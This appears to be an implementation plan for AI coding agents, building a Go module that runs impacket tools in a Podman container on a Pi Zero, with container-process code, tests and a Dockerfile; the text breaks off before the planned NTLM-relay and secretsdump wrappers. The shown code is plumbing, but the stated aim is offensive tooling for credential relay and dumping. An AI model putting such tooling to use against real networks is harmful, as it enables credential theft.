# Tools / Impacket Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement a Go module `tools/` that wraps Podman to run impacket security tools programmatically on the Pi Zero 2W, with typed wrappers for ntlmrelayx and secretsdump.

**Architecture:** One long-running Alpine container holds impacket; each invocation runs as `podman exec container sh -c 'echo $$; exec tool args'` to capture the in-container PID, which is then used for signal delivery via `podman exec container kill`. The `containers/` package is generic; `impacket/` is the typed facade.

**Tech Stack:** Go 1.26, os/exec, io.Pipe, sync.Once, bufio.Scanner, regexp. No external dependencies beyond stdlib.

---

## File map

### `tools/containers/`
| File | Responsibility |
|------|---------------|
| `errors.go` | `ErrPodmanNotFound`, `ErrAlreadyRunning`, `ErrManagerClosed`, `ExitError` |
| `process.go` | `Process` struct + `NewProcess` exported constructor |
| `manager.go` | `Config`, `Option`, `WithCmdFactory`, `ProcManager`, all methods |
| `process_test.go` | Unit tests for `Process` via `NewProcess` |
| `manager_test.go` | Integration tests for `ProcManager` via `WithCmdFactory` |

### `tools/impacket/`
| File | Responsibility |
|------|---------------|
| `Dockerfile` | arm64 image: `python:3.13-alpine` + venv + impacket |
| `impacket.go` | `ProcessStarter` interface, `Impacket` struct, `New`/`NewWithManager` |
| `runner.go` | `Run()` generic script launcher |
| `ntlmrelayx.go` | `NTLMRelayConfig/Event`, `NTLMRelayProcess`, `NTLMRelay()` |
| `secretsdump.go` | `SecretsDumpConfig`, `Credential`, `SecretsDump()` |
| `impacket_test.go` | Shared fake `ProcessStarter` + helper `newFakeProcess` |
| `ntlmrelayx_test.go` | Tests for `NTLMRelay` event parsing + lifecycle |
| `secretsdump_test.go` | Tests for `SecretsDump` credential parsing + cancellation |

---

## Chunk 1: `containers/` package

### Task 1: Module setup

**Files:**
- Create: `tools/go.mod`
- Modify: `go.work`

- [ ] **Step 1: Create `tools/go.mod`**

```
module github.com/oioio-space/oioni/tools

go 1.26
```

Run: `mkdir -p tools/containers tools/impacket`

- [ ] **Step 2: Add to `go.work`**

In `go.work`, add `./tools` to the `use` block:

```
use (
    ./drivers/epd
    ./drivers/touch
    ./drivers/usbgadget
    ./system/imgvol
    ./system/storage
    ./ui/canvas
    ./ui/gui
    ./cmd/oioni
    ./tools
)
```

- [ ] **Step 3: Verify workspace**

Run: `go work sync`
Expected: no output, no error.

---

### Task 2: Sentinel errors + ExitError

**Files:**
- Create: `tools/containers/errors.go`

- [ ] **Step 1: Write `errors.go`**

```go
package containers

import (
	"errors"
	"os/exec"
)

var (
	// ErrPodmanNotFound is returned when the podman binary cannot be located.
	ErrPodmanNotFound = errors.New("containers: podman binary not found")

	// ErrAlreadyRunning is returned by Start when a process with the given name
	// is already registered in the process registry.
	ErrAlreadyRunning = errors.New("containers: process already running")

	// ErrManagerClosed is returned by Start after Close() has been called.
	ErrManagerClosed = errors.New("containers: manager is closed")
)

// ExitError is returned by Process.Wait() when the process exits with a non-zero status.
type ExitError struct {
	Err *exec.ExitError // never nil
}

func (e *ExitError) Error() string { return e.Err.Error() }
func (e *ExitError) Unwrap() error { return e.Err }
func (e *ExitError) ExitCode() int { return e.Err.ExitCode() }
```

- [ ] **Step 2: Verify it compiles**

Run: `cd tools && go build ./containers/`
Expected: no output, no error.

- [ ] **Step 3: Commit**

```bash
git add tools/go.mod go.work go.work.sum tools/containers/errors.go
git commit -m "feat(tools/containers): add module scaffold and sentinel errors"
```

---

### Task 3: `Process` type + `NewProcess`

**Files:**
- Create: `tools/containers/process.go`
- Create: `tools/containers/process_test.go`

- [ ] **Step 1: Write failing tests**

```go
// tools/containers/process_test.go
package containers_test

import (
	"testing"
	"time"

	"github.com/oioio-space/oioni/tools/containers"
)

// makeProcess creates a Process backed by an in-process channel and functions.
func makeProcess(lines []string, waitErr error) (*containers.Process, func()) {
	ch := make(chan string, len(lines)+1)
	for _, l := range lines {
		ch <- l
	}
	killed := make(chan struct{})
	waitCalled := make(chan struct{}, 1)

	wait := func() error {
		waitCalled <- struct{}{}
		<-killed
		return waitErr
	}
	kill := func() error {
		select {
		case <-killed:
		default:
			close(killed)
		}
		return nil
	}
	p := containers.NewProcess(ch, wait, kill)
	// Caller must close ch to signal process exit.
	done := func() {
		close(ch)
		<-waitCalled
		kill()
	}
	return p, done
}

func TestProcess_LinesAndWait(t *testing.T) {
	ch := make(chan string, 2)
	ch <- "line1"
	ch <- "line2"
	done := make(chan struct{})
	wait := func() error { <-done; return nil }
	kill := func() error { return nil }
	p := containers.NewProcess(ch, wait, kill)

	if !p.Running() {
		t.Fatal("expected Running()=true before wait")
	}

	close(done) // simulate process exit
	if err := p.Wait(); err != nil {
		t.Fatalf("Wait() = %v, want nil", err)
	}
	if err := p.Wait(); err != nil { // idempotent
		t.Fatalf("second Wait() = %v, want nil", err)
	}
	if p.Running() {
		t.Fatal("expected Running()=false after wait")
	}

	close(ch) // simulate end of process output (in real impl, the feed goroutine closes it)
	got := []string{}
	for l := range ch { // channel still readable; range terminates when ch closed
		got = append(got, l)
	}
	if len(got) != 2 {
		t.Fatalf("Lines got %v, want [line1 line2]", got)
	}
}

func TestProcess_LinesOpenAfterRunningFalse(t *testing.T) {
	// Guard: Lines() is still readable after Running()=false (OS exit precedes drain).
	ch := make(chan string, 3)
	ch <- "a"
	ch <- "b"
	ch <- "c"

	done := make(chan struct{})
	p := containers.NewProcess(ch, func() error { close(done); return nil }, func() error { return nil })

	// Trigger wait in goroutine
	go p.Wait()
	<-done // wait returned, OS process is "gone"

	if p.Running() {
		t.Fatal("expected Running()=false")
	}
	// channel must still yield buffered lines
	n := 0
	for range ch {
		n++
		if n == 3 {
			break
		}
	}
	if n != 3 {
		t.Fatalf("expected 3 lines after Running()=false, got %d", n)
	}
}

func TestProcess_WaitExitError(t *testing.T) {
	// When wait returns *ExitError, Wait() propagates it.
	exitErr := &containers.ExitError{Err: fakeExitError(t)}
	done := make(chan struct{})
	p := containers.NewProcess(make(chan string), func() error { <-done; return exitErr }, func() error { return nil })
	close(done)
	err := p.Wait()
	if err == nil {
		t.Fatal("want error, got nil")
	}
	var ee *containers.ExitError
	if !errors.As(err, &ee) {
		t.Fatalf("expected *ExitError, got %T: %v", err, err)
	}
}
```

We need `fakeExitError`. Add this helper in the test file:

```go
import (
	"errors"
	"os/exec"
)

func fakeExitError(t *testing.T) *exec.ExitError {
	t.Helper()
	cmd := exec.Command("sh", "-c", "exit 1")
	err := cmd.Run()
	var ee *exec.ExitError
	if !errors.As(err, &ee) {
		t.Fatalf("could not get *exec.ExitError: %v", err)
	}
	return ee
}
```

- [ ] **Step 2: Run tests — expect compile failure**

Run: `cd tools && go test ./containers/ -run TestProcess -v`
Expected: FAIL — `containers.NewProcess` undefined.

- [ ] **Step 3: Implement `process.go`**

```go
// tools/containers/process.go
package containers

import "sync"

// Process represents a running process inside a container.
// Use NewProcess to construct — do not copy a Process.
type Process struct {
	lines  <-chan string
	waitFn func() error
	killFn func() error
	done   chan struct{} // closed when waitFn() has been called and returned
}

// NewProcess constructs a Process from pre-built components.
// Stable public API — used by impacket tests to create fake processes.
//   lines — channel of lines, closed by the provider when the process exits.
//   wait  — blocks until exit; returns nil or *ExitError. Wrapped with sync.Once:
//           subsequent calls return the cached result without blocking.
//   kill  — sends SIGKILL; may return an error if the process is already gone.
func NewProcess(lines <-chan string, wait func() error, kill func() error) *Process {
	p := &Process{
		lines:  lines,
		killFn: kill,
		done:   make(chan struct{}),
	}
	var (
		once   sync.Once
		result error
	)
	p.waitFn = func() error {
		once.Do(func() {
			result = wait()
			close(p.done)
		})
		return result
	}
	return p
}

// Lines returns the channel of stdout+stderr lines. See spec for capacity/drop behaviour.
func (p *Process) Lines() <-chan string { return p.lines }

// Wait blocks until the process exits. Returns nil or *ExitError.
// Idempotent: subsequent calls return the cached result immediately.
func (p *Process) Wait() error { return p.waitFn() }

// Kill sends SIGKILL immediately.
func (p *Process) Kill() error { return p.killFn() }

// Running returns false once the OS process has exited (Wait() has returned).
func (p *Process) Running() bool {
	select {
	case <-p.done:
		return false
	default:
		return true
	}
}
```

- [ ] **Step 4: Run tests — expect pass**

Run: `cd tools && go test ./containers/ -run TestProcess -v -race`
Expected: all PASS, no race detected.

- [ ] **Step 5: Commit**

```bash
git add tools/containers/process.go tools/containers/process_test.go
git commit -m "feat(tools/containers): add Process type and NewProcess constructor"
```

---

### Task 4: `ProcManager` — container init + `WithCmdFactory`

**Files:**
- Create: `tools/containers/manager.go`
- Create: `tools/containers/manager_test.go` (skeleton)

- [ ] **Step 1: Write failing test for container init**

```go
// tools/containers/manager_test.go
package containers_test

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"testing"

	"github.com/oioio-space/oioni/tools/containers"
)

// fakePodman returns a WithCmdFactory that simulates podman subcommands.
// toolLines is what the fake writes after the PID line for tool-launch execs.
func fakePodman(t *testing.T, toolLines []string) containers.Option {
	t.Helper()
	return containers.WithCmdFactory(func(name string, args ...string) *exec.Cmd {
		if len(args) == 0 {
			return exec.Command("true")
		}
		switch args[0] {
		case "pull", "rm":
			return exec.Command("true")
		case "run":
			return exec.Command("true")
		case "exec":
			// args[2] == "kill" → signal delivery
			if len(args) >= 3 && args[2] == "kill" {
				return exec.Command("true")
			}
			// Tool launch: write PID then tool lines
			output := "42\n" + strings.Join(toolLines, "\n")
			if len(toolLines) > 0 {
				output += "\n"
			}
			return exec.Command("sh", "-c", fmt.Sprintf("printf %%s %q", output))
		default:
			return exec.Command("true")
		}
	})
}

func testConfig() containers.Config {
	return containers.Config{
		Image:   "oioni/impacket:arm64",
		Name:    "test-container",
		Network: "host",
		Caps:    []string{"NET_RAW", "NET_ADMIN"},
	}
}

func TestProcManager_ContainerInit(t *testing.T) {
	mgr := containers.NewManager(testConfig(), fakePodman(t, nil))
	defer mgr.Close()

	ctx := context.Background()
	proc, err := mgr.Start(ctx, "test", "echo", []string{"hello"})
	if err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	if proc == nil {
		t.Fatal("Start() returned nil proc")
	}
	proc.Wait()
}
```

- [ ] **Step 2: Run — expect compile failure**

Run: `cd tools && go test ./containers/ -run TestProcManager_ContainerInit -v`
Expected: FAIL — `containers.NewManager` undefined.

- [ ] **Step 3: Implement `manager.go` scaffold + container init**

```go
// tools/containers/manager.go
package containers

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"os/exec"
	"strconv"
	"strings"
	"sync"
)

// Config describes a managed container.
type Config struct {
	Image   string   // e.g. "oioni/impacket:arm64"
	Name    string   // container name, unique per instance
	Network string   // "host" for USB gadget interface access
	Caps    []string // Linux capabilities, e.g. ["NET_RAW", "NET_ADMIN"]
}

// Option is a functional option for NewManager.
type Option func(*ProcManager)

// WithCmdFactory replaces the internal exec.Cmd factory for all podman invocations.
// The factory is called once per invocation; the returned *exec.Cmd is used once only.
// See spec for the two exec subcommand patterns (tool launch vs signal delivery).
func WithCmdFactory(factory func(name string, args ...string) *exec.Cmd) Option {
	return func(m *ProcManager) { m.cmdFactory = factory }
}

// procEntry is a registry slot for a running process.
type procEntry struct {
	proc         *Process
	cmd          *exec.Cmd
	containerPID int
	gone         chan struct{} // closed by the background watcher goroutine after deregistration
}

// ProcManager manages a single long-running container and the processes inside it.
type ProcManager struct {
	cfg        Config
	cmdFactory func(string, ...string) *exec.Cmd

	once     sync.Once
	startErr error

	mu     sync.Mutex
	closed bool
	procs  map[string]*procEntry

	wg sync.WaitGroup // tracks background watcher goroutines
}

// NewManager creates a ProcManager. No I/O occurs at construction time.
func NewManager(cfg Config, opts ...Option) *ProcManager {
	m := &ProcManager{
		cfg:   cfg,
		procs: make(map[string]*procEntry),
	}
	m.cmdFactory = defaultCmdFactory
	for _, o := range opts {
		o(m)
	}
	return m
}

func defaultCmdFactory(name string, args ...string) *exec.Cmd {
	return exec.Command(name, args...)
}

// initContainer pulls the image and starts the long-running container.
// Called exactly once via sync.Once.
func (m *ProcManager) initContainer(ctx context.Context) error {
	// Pull image
	pullCmd := m.cmdFactory("podman", "pull", m.cfg.Image)
	pullCmd.Stderr = io.Discard
	if err := pullCmd.Run(); err != nil {
		if isNotFound(err) {
			return ErrPodmanNotFound
		}
		return fmt.Errorf("containers: podman pull %s: %w", m.cfg.Image, err)
	}

	// Build podman run args
	runArgs := []string{"run", "-d", "--name", m.cfg.Name}
	if m.cfg.Network != "" {
		runArgs = append(runArgs, "--network", m.cfg.Network)
	}
	for _, cap := range m.cfg.Caps {
		runArgs = append(runArgs, "--cap-add", cap)
	}
	runArgs = append(runArgs, m.cfg.Image, "sleep", "infinity")

	runCmd := m.cmdFactory("podman", runArgs...)
	runCmd.Stderr = io.Discard
	if err := runCmd.Run(); err != nil {
		return fmt.Errorf("containers: podman run: %w", err)
	}
	return nil
}

func isNotFound(err error) bool {
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return false // podman exists but failed for another reason
	}
	// exec.ErrNotFound or similar path errors
	return true
}
```

- [ ] **Step 4: Run init test — expect pass**

Run: `cd tools && go test ./containers/ -run TestProcManager_ContainerInit -v -race`
Expected: PASS (Start not yet implemented, but test will fail differently — add a build stub).

Actually, add a temporary stub for Start in manager.go at this point:

```go
// Stub — replaced in Task 5
func (m *ProcManager) Start(ctx context.Context, name, executable string, args []string) (*Process, error) {
	return nil, errors.New("not implemented")
}
func (m *ProcManager) Stop(ctx context.Context, name string) error  { return nil }
func (m *ProcManager) Kill(name string) error                        { return nil }
func (m *ProcManager) List() []string                                { return nil }
func (m *ProcManager) Close() error                                  { return nil }
```

Run: `cd tools && go test ./containers/ -run TestProcManager_ContainerInit -v`
Expected: FAIL with "not implemented" — confirms wiring is correct.

- [ ] **Step 5: Commit scaffold**

```bash
git add tools/containers/manager.go tools/containers/manager_test.go
git commit -m "feat(tools/containers): add ProcManager scaffold with container init"
```

---

### Task 5: `ProcManager` — `Start`, `Stop`, `Kill`, `Close`

**Files:**
- Modify: `tools/containers/manager.go` (replace stubs)
- Modify: `tools/containers/manager_test.go` (add tests)

- [ ] **Step 1: Add tests for Start/Stop/Kill/Close**

Append to `manager_test.go`:

```go
func TestProcManager_StartAndLines(t *testing.T) {
	mgr := containers.NewManager(testConfig(), fakePodman(t, []string{"hello", "world"}))
	defer mgr.Close()

	proc, err := mgr.Start(context.Background(), "myproc", "echo", []string{"hello"})
	if err != nil {
		t.Fatalf("Start: %v", err)
	}

	var got []string
	for l := range proc.Lines() {
		got = append(got, l)
	}
	if len(got) != 2 || got[0] != "hello" || got[1] != "world" {
		t.Fatalf("Lines() = %v, want [hello world]", got)
	}
}

func TestProcManager_ErrAlreadyRunning(t *testing.T) {
	// Fake that blocks until killed
	block := make(chan struct{})
	mgr := containers.NewManager(testConfig(), containers.WithCmdFactory(func(name string, args ...string) *exec.Cmd {
		if len(args) > 0 && args[0] == "exec" {
			if len(args) >= 3 && args[2] == "kill" {
				close(block) // kill signal received — only called once
				return exec.Command("true")
			}
			// Tool launch: write PID then block (simulates long-running process)
			return exec.Command("sh", "-c", "echo 42; cat")
		}
		return exec.Command("true") // pull, run, rm — must NOT close(block)
	}))
	defer mgr.Close()

	ctx := context.Background()
	if _, err := mgr.Start(ctx, "same", "cat", nil); err != nil {
		t.Fatalf("first Start: %v", err)
	}
	if _, err := mgr.Start(ctx, "same", "cat", nil); !errors.Is(err, containers.ErrAlreadyRunning) {
		t.Fatalf("want ErrAlreadyRunning, got %v", err)
	}
}

func TestProcManager_ErrManagerClosed(t *testing.T) {
	mgr := containers.NewManager(testConfig(), fakePodman(t, nil))
	mgr.Close()
	_, err := mgr.Start(context.Background(), "x", "echo", nil)
	if !errors.Is(err, containers.ErrManagerClosed) {
		t.Fatalf("want ErrManagerClosed, got %v", err)
	}
}

func TestProcManager_List(t *testing.T) {
	mgr := containers.NewManager(testConfig(), fakePodman(t, []string{"out"}))
	defer mgr.Close()
	ctx := context.Background()

	if _, err := mgr.Start(ctx, "p1", "echo", nil); err != nil {
		t.Fatal(err)
	}

	list := mgr.List()
	if len(list) != 1 || list[0] != "p1" {
		t.Fatalf("List() = %v, want [p1]", list)
	}
}

func TestProcManager_CloseWaitsForWatchers(t *testing.T) {
	mgr := containers.NewManager(testConfig(), fakePodman(t, nil))
	ctx := context.Background()
	if _, err := mgr.Start(ctx, "p", "echo", nil); err != nil {
		t.Fatal(err)
	}
	mgr.Close()
	if list := mgr.List(); len(list) != 0 {
		t.Fatalf("after Close: List() = %v, want empty", list)
	}
}
```

- [ ] **Step 2: Run tests — all fail**

Run: `cd tools && go test ./containers/ -v -race`
Expected: most tests FAIL — Start returns "not implemented".

- [ ] **Step 3: Implement `launchProc` helper**

Replace the stub `Start` in `manager.go` with:

```go
// launchProc runs `podman exec container sh -c 'echo $$; exec tool args'`,
// reads the containerPID from the first stdout line, and returns a *Process
// fed by the remaining output.
func (m *ProcManager) launchProc(name, executable string, args []string) (*Process, *procEntry, error) {
	// Build: sh -c 'echo $$; exec tool arg1 arg2 ...'
	quotedArgs := make([]string, len(args))
	for i, a := range args {
		quotedArgs[i] = shellQuote(a)
	}
	var shCmd string
	if len(args) > 0 {
		shCmd = fmt.Sprintf("echo $$; exec %s %s", shellQuote(executable), strings.Join(quotedArgs, " "))
	} else {
		shCmd = fmt.Sprintf("echo $$; exec %s", shellQuote(executable))
	}

	cmd := m.cmdFactory("podman", "exec", m.cfg.Name, "sh", "-c", shCmd)

	// Merge stdout+stderr via io.Pipe so we can read them sequentially.
	pr, pw := io.Pipe()
	cmd.Stdout = pw
	cmd.Stderr = pw

	if err := cmd.Start(); err != nil {
		pw.Close()
		pr.Close()
		return nil, nil, fmt.Errorf("containers: podman exec: %w", err)
	}

	scanner := bufio.NewScanner(pr)

	// Read first line = containerPID
	if !scanner.Scan() {
		scanErr := scanner.Err()
		pw.Close()
		pr.Close()
		cmd.Process.Kill()
		cmd.Wait()
		if scanErr != nil {
			return nil, nil, fmt.Errorf("containers: reading containerPID: %w", scanErr)
		}
		return nil, nil, fmt.Errorf("containers: process exited before writing PID")
	}
	pidStr := strings.TrimSpace(scanner.Text())
	containerPID, err := strconv.Atoi(pidStr)
	if err != nil {
		pw.Close()
		pr.Close()
		cmd.Process.Kill()
		cmd.Wait()
		return nil, nil, fmt.Errorf("containers: invalid containerPID %q: %w", pidStr, err)
	}

	// Feed remaining lines into a buffered channel (capacity 64, non-blocking send).
	linesCh := make(chan string, 64)
	go func() {
		defer close(linesCh)
		for scanner.Scan() {
			select {
			case linesCh <- scanner.Text():
			default: // drop on full
			}
		}
	}()

	// waitFn: call cmd.Wait() once; close pw to unblock the scanner goroutine.
	var (
		waitOnce   sync.Once
		waitResult error
	)
	waitFn := func() error {
		waitOnce.Do(func() {
			waitResult = cmd.Wait()
			pw.Close() // unblocks scanner → closes linesCh
			if waitResult != nil {
				var exitErr *exec.ExitError
				if errors.As(waitResult, &exitErr) {
					waitResult = &ExitError{Err: exitErr}
				} else {
					// pipe closed or other non-exit error — treat as success
					waitResult = nil
				}
			}
		})
		return waitResult
	}

	// killFn: SIGKILL the in-container process via `podman exec container kill -KILL <pid>`
	killFn := func() error { return m.sendSignal(containerPID, "KILL") }

	proc := NewProcess(linesCh, waitFn, killFn)
	entry := &procEntry{proc: proc, cmd: cmd, containerPID: containerPID, gone: make(chan struct{})}
	return proc, entry, nil
}

// sendSignal runs `podman exec <container> kill -<SIG> <pid>` inside the container.
func (m *ProcManager) sendSignal(containerPID int, sig string) error {
	cmd := m.cmdFactory("podman", "exec", m.cfg.Name, "kill",
		"-"+sig, strconv.Itoa(containerPID))
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("containers: kill -%s %d: %w: %s", sig, containerPID, err, out)
	}
	return nil
}

// shellQuote adds single quotes around s, escaping any single quotes within.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}
```

- [ ] **Step 4: Implement `Start`, `Stop`, `Kill`, `List`, `Close`**

Append to `manager.go`:

```go
// Start ensures the backing container is running, then launches a named process.
func (m *ProcManager) Start(ctx context.Context, name, executable string, args []string) (*Process, error) {
	// Lazy container init (sync.Once — errors are stored and returned on retry).
	m.once.Do(func() { m.startErr = m.initContainer(ctx) })
	if m.startErr != nil {
		return nil, m.startErr
	}

	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		return nil, ErrManagerClosed
	}
	if _, exists := m.procs[name]; exists {
		m.mu.Unlock()
		return nil, ErrAlreadyRunning
	}
	// Reserve slot to prevent concurrent Start with same name.
	m.procs[name] = nil
	m.mu.Unlock()

	proc, entry, err := m.launchProc(name, executable, args)
	if err != nil {
		m.mu.Lock()
		delete(m.procs, name)
		m.mu.Unlock()
		return nil, err
	}

	m.mu.Lock()
	m.procs[name] = entry
	m.mu.Unlock()

	// Background watcher: deregister name when process exits, then signal entry.gone.
	// entry.gone being closed guarantees Stop() callers see an empty registry slot.
	m.wg.Add(1)
	go func() {
		defer m.wg.Done()
		proc.Wait()
		m.mu.Lock()
		delete(m.procs, name)
		m.mu.Unlock()
		close(entry.gone) // must happen after delete; Stop waits on this
	}()

	return proc, nil
}

// Stop sends SIGTERM to the named process and waits for full deregistration.
// Escalates to SIGKILL after 10 s, then waits 5 more seconds.
// Returns only after the name has been removed from the registry (entry.gone closed
// by the background watcher), so a subsequent Start() with the same name is safe.
func (m *ProcManager) Stop(ctx context.Context, name string) error {
	m.mu.Lock()
	entry := m.procs[name]
	m.mu.Unlock()
	if entry == nil {
		return fmt.Errorf("containers: process %q not found", name)
	}

	stopCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	_ = m.sendSignal(entry.containerPID, "TERM")

	// Wait for watcher to deregister (guarantees registry is clean on return).
	select {
	case <-entry.gone:
		return nil
	case <-stopCtx.Done():
		_ = m.sendSignal(entry.containerPID, "KILL")
	}

	killCtx, killCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer killCancel()
	select {
	case <-entry.gone:
		return nil
	case <-killCtx.Done():
		return fmt.Errorf("containers: process %q did not exit within 5s after SIGKILL (zombie)", name)
	}
}

// Kill sends SIGKILL immediately. Deregistration is async (background watcher).
func (m *ProcManager) Kill(name string) error {
	m.mu.Lock()
	entry := m.procs[name]
	m.mu.Unlock()
	if entry == nil {
		return fmt.Errorf("containers: process %q not found", name)
	}
	return m.sendSignal(entry.containerPID, "KILL")
}

// List returns the names of all currently registered processes.
func (m *ProcManager) List() []string {
	m.mu.Lock()
	defer m.mu.Unlock()
	names := make([]string, 0, len(m.procs))
	for k, v := range m.procs {
		if v != nil {
			names = append(names, k)
		}
	}
	return names
}

// Close kills all running processes and removes the container.
// Waits for all background watcher goroutines to complete before returning.
func (m *ProcManager) Close() error {
	m.mu.Lock()
	m.closed = true
	entries := make([]*procEntry, 0, len(m.procs))
	for _, e := range m.procs {
		if e != nil {
			entries = append(entries, e)
		}
	}
	m.mu.Unlock()

	for _, e := range entries {
		_ = m.sendSignal(e.containerPID, "KILL")
	}
	m.wg.Wait() // wait for all watchers to deregister

	rmCmd := m.cmdFactory("podman", "rm", "-f", m.cfg.Name)
	rmCmd.Stderr = io.Discard
	_ = rmCmd.Run()
	return nil
}
```

Add missing import `"time"` to the import block.

- [ ] **Step 5: Run all containers tests — expect pass**

Run: `cd tools && go test ./containers/ -v -race`
Expected: all PASS, no race detected.

- [ ] **Step 6: Commit**

```bash
git add tools/containers/manager.go tools/containers/manager_test.go
git commit -m "feat(tools/containers): implement ProcManager with Start/Stop/Kill/Close"
```

---

## Chunk 2: `impacket/` package

### Task 6: Dockerfile + module init + ProcessStarter interface

**Files:**
- Create: `tools/impacket/Dockerfile`
- Create: `tools/impacket/impacket.go`
- Create: `tools/impacket/impacket_test.go` (shared fake)

- [ ] **Step 1: Create `Dockerfile`**

```dockerfile
# tools/impacket/Dockerfile
# Build for arm64: podman build --platform linux/arm64 -t oioni/impacket:arm64 .
FROM python:3.13-alpine

# Use a venv so pip does not conflict with the system Python (PEP 668).
# Alpine busybox provides sh and kill — required by ProcManager signal delivery.
RUN python -m venv /opt/impacket \
 && /opt/impacket/bin/pip install --no-cache-dir impacket

ENV PATH="/opt/impacket/bin:$PATH"
```

- [ ] **Step 2: Create `impacket.go`**

```go
// tools/impacket/impacket.go
package impacket

import (
	"context"

	"github.com/oioio-space/oioni/tools/containers"
)

// ProcessStarter is the full lifecycle interface impacket needs.
// *containers.ProcManager satisfies this interface.
// Test fakes implement all three methods; Stop and Kill may be no-ops when
// the test does not exercise lifecycle management.
type ProcessStarter interface {
	Start(ctx context.Context, name, executable string, args []string) (*containers.Process, error)
	Stop(ctx context.Context, name string) error
	Kill(name string) error
}

// impacketConfig holds future configuration (image override, etc.).
type impacketConfig struct{}

// ImpacketOption is a functional option for New().
type ImpacketOption func(*impacketConfig)

// defaultImage is the arm64 impacket image built from tools/impacket/Dockerfile.
const defaultImage = "oioni/impacket:arm64"

// Impacket provides typed wrappers for impacket scripts running in a container.
type Impacket struct {
	mgr ProcessStarter
}

// New returns an Impacket backed by a real ProcManager.
// The container is not started until the first tool call.
func New(opts ...ImpacketOption) *Impacket {
	cfg := &impacketConfig{}
	for _, o := range opts {
		o(cfg)
	}
	mgr := containers.NewManager(containers.Config{
		Image:   defaultImage,
		Name:    "oioni-impacket",
		Network: "host",
		Caps:    []string{"NET_RAW", "NET_ADMIN"},
	})
	return &Impacket{mgr: mgr}
}

// NewWithManager injects a custom ProcessStarter (for tests).
func NewWithManager(mgr ProcessStarter) *Impacket {
	return &Impacket{mgr: mgr}
}
```

- [ ] **Step 3: Create shared test fake in `impacket_test.go`**

```go
// tools/impacket/impacket_test.go
package impacket_test

import (
	"context"
	"errors"
	"fmt"
	"io"
	"testing"

	"github.com/oioio-space/oioni/tools/containers"
)

// fakeStarter implements ProcessStarter entirely in-process.
// Call add() before Start() to register scripted outputs per process name.
type fakeStarter struct {
	t      *testing.T
	scripts map[string][]string // name → lines to emit
}

func newFakeStarter(t *testing.T) *fakeStarter {
	t.Helper()
	return &fakeStarter{t: t, scripts: make(map[string][]string)}
}

func (f *fakeStarter) add(name string, lines []string) {
	f.scripts[name] = lines
}

func (f *fakeStarter) Start(_ context.Context, name, _ string, _ []string) (*containers.Process, error) {
	lines, ok := f.scripts[name]
	if !ok {
		return nil, fmt.Errorf("fakeStarter: unknown process %q", name)
	}
	// Pre-fill and immediately close the channel: the process "exits" as soon as all
	// buffered lines are written. No goroutines needed — no data races possible.
	ch := make(chan string, len(lines))
	for _, l := range lines {
		ch <- l
	}
	close(ch)
	wait := func() error { return nil } // returns immediately
	kill := func() error { return nil } // no-op: process already "exited"
	return containers.NewProcess(ch, wait, kill), nil
}

func (f *fakeStarter) Stop(_ context.Context, name string) error { return nil }
func (f *fakeStarter) Kill(name string) error                     { return nil }

// fakeProcess builds a *containers.Process backed by explicit channels/funcs.
func fakeProcess(lines []string, waitErr error) (*containers.Process, func()) {
	ch := make(chan string, len(lines)+1)
	for _, l := range lines {
		ch <- l
	}
	done := make(chan struct{})
	wait := func() error {
		<-done
		return waitErr
	}
	kill := func() error {
		select {
		case <-done:
		default:
			close(done)
		}
		return nil
	}
	proc := containers.NewProcess(ch, wait, kill)
	complete := func() {
		select {
		case <-done:
		default:
			close(done)
		}
		close(ch)
	}
	return proc, complete
}

// must fails the test if err is non-nil.
func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

// suppress unused import warning
var _ = io.Discard
var _ = errors.New
```

- [ ] **Step 4: Verify compiles**

Run: `cd tools && go build ./impacket/`
Expected: no error.

- [ ] **Step 5: Commit**

```bash
git add tools/impacket/Dockerfile tools/impacket/impacket.go tools/impacket/impacket_test.go
git commit -m "feat(tools/impacket): add Dockerfile, facade, ProcessStarter interface, test helpers"
```

---

### Task 7: Generic `Run()` runner

**Files:**
- Create: `tools/impacket/runner.go`
- Create: `tools/impacket/runner_test.go` (add to impacket_test.go package)

- [ ] **Step 1: Write failing test**

Create `tools/impacket/runner_test.go`:

```go
// tools/impacket/runner_test.go
package impacket_test

import (
	"context"
	"testing"

	"github.com/oioio-space/oioni/tools/impacket"
)

func TestRun_LinesPassedThrough(t *testing.T) {
	fake := newFakeStarter(t)
	fake.add("myrun", []string{"output line 1", "output line 2"})

	imp := impacket.NewWithManager(fake)
	proc, err := imp.Run(context.Background(), "myrun", "samrdump", []string{"-target", "192.168.1.1"})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}

	var got []string
	for l := range proc.Lines() {
		got = append(got, l)
	}
	if len(got) != 2 {
		t.Fatalf("got %v lines, want 2", got)
	}
}
```

- [ ] **Step 2: Run — expect compile failure**

Run: `cd tools && go test ./impacket/ -run TestRun -v`
Expected: FAIL — `imp.Run` undefined.

- [ ] **Step 3: Implement `runner.go`**

```go
// tools/impacket/runner.go
package impacket

import (
	"context"

	"github.com/oioio-space/oioni/tools/containers"
)

// Run launches any impacket script by name with raw args.
// name identifies the process in the registry (must be unique among running procs).
// tool is the impacket script name, e.g. "samrdump", "lookupsid".
func (i *Impacket) Run(ctx context.Context, name, tool string, args []string) (*containers.Process, error) {
	return i.mgr.Start(ctx, name, tool, args)
}
```

- [ ] **Step 4: Run test — expect pass**

Run: `cd tools && go test ./impacket/ -run TestRun -v -race`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add tools/impacket/runner.go tools/impacket/runner_test.go
git commit -m "feat(tools/impacket): add generic Run() launcher"
```

---

### Task 8: `NTLMRelay` wrapper

**Files:**
- Create: `tools/impacket/ntlmrelayx.go`
- Create: `tools/impacket/ntlmrelayx_test.go`

- [ ] **Step 1: Write failing tests**

```go
// tools/impacket/ntlmrelayx_test.go
package impacket_test

import (
	"context"
